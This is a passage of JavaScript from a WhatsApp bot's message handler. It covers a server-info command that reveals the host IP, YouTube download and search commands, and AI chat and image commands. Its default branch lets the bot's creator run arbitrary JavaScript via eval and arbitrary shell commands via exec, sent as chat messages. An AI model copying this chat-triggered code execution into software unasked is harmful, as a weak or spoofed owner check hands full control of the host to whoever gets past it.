          let respon = `┌ WhatsApp Bot Information\n│\n├ Server Network\n│  › Ping        : ${latensi.toFixed(4)} seconds\n│\n├ Server Information\n│  › OS          : ${osInfo}\n│  › IP Address  : ${nou.os.ip()}\n│  › OS Type     : ${nou.os.type()}\n│\n├ Memory\n│  › Total       : ${formatp(os.totalmem())}\n│  › Used        : ${formatp(os.totalmem() - os.freemem())}\n│\n├ Storage\n│  › Total       : ${storage.totalGb} GB\n│  › Used        : ${storage.usedGb} GB (${storage.usedPercentage}%)\n│  › Available   : ${storage.freeGb} GB (${storage.freePercentage}%)\n│\n├ Server Uptime\n│  › Runtime     : ${runtime(process.uptime())}${cpus.length ? `\n│\n├ CPU (${cpus.length} Core)\n│  › Model       : ${cpus[0]?.model.trim() || "Not Detected"}\n│  › Speed       : ${cpu.speed} MHz\n${Object.keys(cpu.times).map((type) => `│  › ${type}${" ".repeat(Math.max(0, 10 - type.length))}: ${((100 * cpu.times[type]) / cpu.total).toFixed(2)}%`).join("\n")}` : ""}\n\n© ${MENU_FOOTER}`;
          sock.sendMessage(m.chat, {
            text: respon,
            footer: `by devorsixcore | t.me/devorsixcore`,
            buttons: [
              { buttonId: ".ping", buttonText: { displayText: "Repeat" }, type: 1 },
              { buttonId: ".menu", buttonText: { displayText: "Main Menu" }, type: 1 },
            ],
            headerType: 1,
            viewOnce: true,
          }, { quoted: m });
        } catch (err) {
          console.error(err);
        }
      }
      break;

      case "ytmp4": {
        if (!q) return m.reply(`Usage: ${prefix + command} <youtube url>`);
        if (!isUrl(q)) return m.reply("Invalid URL.");
        m.reply("Preparing the video. Please wait...");
        try {
          let res = await ytmp4(q);
          if (!res || !res.url) return m.reply("Failed to retrieve video data.");
          await sock.sendMessage(m.chat, { video: { url: res.url }, caption: `Download complete: ${res.title || "-"}` }, { quoted: m });
        } catch (err) {
          console.error(err);
          m.reply("An error occurred while processing the video.");
        }
      }
      break;

      case "ytmp3": {
        if (!q) return m.reply(`Usage: ${prefix + command} <youtube url>`);
        if (!isUrl(q)) return m.reply("Invalid URL.");
        m.reply("Preparing the audio. Please wait...");
        try {
          let res = await ytmp3(q);
          if (!res || !res.url) return m.reply("Failed to retrieve audio data.");
          await sock.sendMessage(m.chat, { audio: { url: res.url }, mimetype: "audio/mpeg" }, { quoted: m });
        } catch (err) {
          console.error(err);
          m.reply("An error occurred while processing the audio.");
        }
      }
      break;

      case "play": {
        if (!q) return m.reply(`Usage: ${prefix + command} <song title>\n\nExample:\n${prefix + command} alan walker fade`);
        try {
          let [kw, pg] = q.split("|");
          let query = pg ? kw : q, page = pg ? parseInt(pg) : 1;
          if (!global.playCache) global.playCache = {};
          if (!global.playCache[m.sender] || global.playCache[m.sender].query !== query) {
            m.reply("Searching YouTube...");
            let search = await yts(query);
            if (!search?.videos?.length) return m.reply("No results found.");
            global.playCache[m.sender] = { query, videos: search.videos };
          }
          let data = global.playCache[m.sender];
          let start = (page - 1) * 7, end = start + 7;
          let list = data.videos.slice(start, end);
          let cards = [];
          for (let v of list) {
            cards.push({
              image: { url: v.thumbnail },
              title: v.title?.slice(0, 60) || "Untitled",
              body: `${v.author.name} | ${v.timestamp}`,
              footer: `${v.views.toLocaleString()} views`,
              buttons: [
                { name: "quick_reply", buttonParamsJson: JSON.stringify({ display_text: "Audio", id: `.ytmp3 https://youtu.be/${v.videoId}` }) },
                { name: "quick_reply", buttonParamsJson: JSON.stringify({ display_text: "Video", id: `.ytmp4 https://youtu.be/${v.videoId}` }) },
                { name: "cta_url", buttonParamsJson: JSON.stringify({ display_text: "Watch on YouTube", url: `https://youtu.be/${v.videoId}` }) },
              ],
            });
          }
          if (data.videos.length > end) {
            cards.push({
              image: { url: "https://cdn-icons-png.flaticon.com/512/4315/4315445.png" },
              title: "Next page",
              body: `Show the next results (${page + 1})`,
              footer: "Click the button below to continue",
              buttons: [{ name: "quick_reply", buttonParamsJson: JSON.stringify({ display_text: "Next Page", id: `.play ${query}|${page + 1}` }) }],
            });
          }
          await sock.sendMessage(m.chat, { text: `YouTube search results for: ${query}`, title: "YouTube Search", subtitle: `Page ${page}`, footer: `Showing ${list.length} of ${data.videos.length} results.`, cards }, { quoted: m });
        } catch (err) {
          console.error(err);
          m.reply("An error occurred while searching for songs.");
        }
      }
      break;

      case "aigen": {
        if (!q) return m.reply(`Usage: ${prefix + command} <prompt>\nExample: ${prefix + command} a sunset on the beach in anime style`);
        await sock.react(m, "🕑");
        try {
          let res = await generateDeepImg({ prompt: q, style: "anime", size: "1:1" });
          if (!res.status) return m.reply("Failed to generate the image.");
          await sock.sendMessage(m.chat, { image: { url: res.image }, caption: `AI Generated Image\nPrompt: ${q}\nStyle: Anime` }, { quoted: m });
          await sock.react(m, "✅");
        } catch (e) {
          console.error(e);
          m.reply("An error occurred while generating the image.");
        }
      }
      break;

      case "aichat": {
        if (!q) return m.reply(`Usage: ${prefix + command} <question>\nExample: ${prefix + command} who is the president of Indonesia?`);
        await sock.react(m, "🕑");
        try {
          let res = await venicechat(q);
          await m.reply(`Venice AI Response:\n\n${res}`);
          await sock.react(m, "✅");
        } catch (e) {
          console.error(e);
          m.reply("An error occurred while chatting with the AI.");
        }
      }
      break;

      case "gptai": {
        if (!q) return m.reply(`Usage: ${prefix + command} <question>\nExample: ${prefix + command} explain the theory of relativity.`);
        await sock.react(m, "🕑");
        try {
          let res = await chatWithGPT(q);
          await m.reply(`ChatGPT AI:\n\n${res.data}`);
          await sock.react(m, "✅");
        } catch (e) {
          console.error(e);
          m.reply("Failed to get a response from the AI.");
        }
      }
      break;

      default:
        if (body.startsWith("<")) {
          if (!isCreator) return;
          try {
            const output = await eval(`(async () => ${q})()`);
            await m.reply(`${typeof output === "string" ? output : JSON.stringify(output, null, 4)}`);
          } catch (e) {
            await m.reply(`Error: ${String(e)}`);
          }
        }
        if (body.startsWith(">")) {
          if (!isCreator) return;
          try {
            let evaled = await eval(q);
            if (typeof evaled !== "string") evaled = util.inspect(evaled);
            await m.reply(evaled);
          } catch (e) {
            await m.reply(`Error: ${String(e)}`);
          }
        }
        if (body.startsWith("$")) {
          if (!isCreator) return;
          exec(q, (err, stdout) => {
            if (err) return m.reply(err.toString());
            if (stdout) return m.reply(stdout.toString());
          });
        }
    }
  } catch (porno) {
    console.log("Message handler error:", porno);
  }
};

let file = require.resolve(__filename);
fs.watchFile(file, () => {
  fs.unwatchFile(file);
  console.log(chalk.redBright(`Update ${__filename}`));
  delete require.cache[file];
  require(file);
});